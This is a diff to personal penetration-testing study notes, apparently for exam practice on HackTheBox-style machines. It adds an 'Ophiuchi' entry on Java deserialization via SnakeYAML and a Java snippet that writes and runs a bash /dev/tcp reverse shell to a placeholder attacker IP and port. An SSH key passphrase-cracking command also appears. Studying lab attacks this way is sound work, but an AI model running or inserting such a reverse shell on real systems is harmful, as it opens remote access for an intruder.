@@ -26,6 +26,7 @@
 | Nibbles | page source, directory | sudo list |
 | *NineVeh | brute force attack http & https, phpLiteAdmin | crontab, chkrootkit |
 | OpenAdmin | OpenNetAdmin, pwd in conf file & <br> [frp](https://github.com/fatedier/frp), cracking passphrase | sudo list, GTFO |
+| *Ophiuchi | [Java-Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet), SnakeYAML | sudo list, GO programming |
 
 (*):review before the exam
 
@@ -133,4 +134,13 @@ crack SSH private key passphrase
 ```
 ssh2john id_rsa > id_rsa.hash
 john id_rsa.hash -wordlist=rockyou.txt
+```
+
+Used in ```Ophiuchi```
+
+one line reverse shell command in Java
+
+```Java
+String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
+Runtime.getRuntime().exec(cmdline);
 ```
